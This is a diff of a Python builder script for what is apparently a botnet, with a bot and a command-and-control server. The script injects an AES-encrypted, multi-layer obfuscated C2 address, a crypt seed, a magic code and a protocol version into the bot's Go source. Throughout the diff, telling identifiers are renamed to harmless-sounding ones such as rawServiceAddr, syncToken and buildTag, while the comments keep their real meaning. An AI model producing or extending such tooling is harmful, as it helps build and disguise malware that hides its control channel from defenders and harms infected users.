@@ -397,8 +397,8 @@ def update_bot_debug_mode(bot_path: str, debug_enabled: bool) -> bool:
 
         debug_value = "true" if debug_enabled else "false"
         content = re.sub(
-            r"var debugMode\s*=\s*(true|false)",
-            f"var debugMode = {debug_value}",
+            r"var verboseLog\s*=\s*(true|false)",
+            f"var verboseLog = {debug_value}",
             content,
         )
 
@@ -433,32 +433,32 @@ def update_bot_main_go(
     with open(config_go_path, "r") as f:
         content = f.read()
 
-    # Update encGothTits (AES-encrypted obfuscated C2 — 6th layer)
-    enc_goth_tits = aes_ctr_encrypt(obfuscated_c2)
+    # Update rawServiceAddr (AES-encrypted obfuscated C2 — 6th layer)
+    enc_service_addr = aes_ctr_encrypt(obfuscated_c2)
     content = re.sub(
-        r'var encGothTits, _ = hex\.DecodeString\("[^"]*"\)',
-        lambda m: f'var encGothTits, _ = hex.DecodeString("{enc_goth_tits}")',
+        r'var rawServiceAddr, _ = hex\.DecodeString\("[^"]*"\)',
+        lambda m: f'var rawServiceAddr, _ = hex.DecodeString("{enc_service_addr}")',
         content,
     )
 
-    # Update cryptSeed
+    # Update configSeed
     content = re.sub(
-        r'const cryptSeed\s*=\s*"[^"]*"',
-        lambda m: f'const cryptSeed = "{crypt_seed}"',
+        r'const configSeed\s*=\s*"[^"]*"',
+        lambda m: f'const configSeed = "{crypt_seed}"',
         content,
     )
 
-    # Update magicCode
+    # Update syncToken (magic code)
     content = re.sub(
-        r'const magicCode\s*=\s*"[^"]*"',
-        lambda m: f'const magicCode = "{magic_code}"',
+        r'const syncToken\s*=\s*"[^"]*"',
+        lambda m: f'const syncToken = "{magic_code}"',
         content,
     )
 
-    # Update protocolVersion
+    # Update buildTag (protocol version)
     content = re.sub(
-        r'const protocolVersion\s*=\s*"[^"]*"',
-        lambda m: f'const protocolVersion = "{protocol_version}"',
+        r'const buildTag\s*=\s*"[^"]*"',
+        lambda m: f'const buildTag = "{protocol_version}"',
         content,
     )
 
@@ -686,18 +686,18 @@ def get_current_config(bot_path: str, cnc_path: str) -> dict:
         with open(bot_config, "r") as f:
             content = f.read()
 
-            # Extract magicCode
-            match = re.search(r'const magicCode\s*=\s*"([^"]*)"', content)
+            # Extract syncToken (magic code)
+            match = re.search(r'const syncToken\s*=\s*"([^"]*)"', content)
             if match:
                 config["magic_code"] = match.group(1)
 
-            # Extract protocolVersion
-            match = re.search(r'const protocolVersion\s*=\s*"([^"]*)"', content)
+            # Extract buildTag (protocol version)
+            match = re.search(r'const buildTag\s*=\s*"([^"]*)"', content)
             if match:
                 config["protocol_version"] = match.group(1)
 
-            # Extract cryptSeed
-            match = re.search(r'const cryptSeed\s*=\s*"([^"]*)"', content)
+            # Extract configSeed
+            match = re.search(r'const configSeed\s*=\s*"([^"]*)"', content)
             if match:
                 config["crypt_seed"] = match.group(1)
 
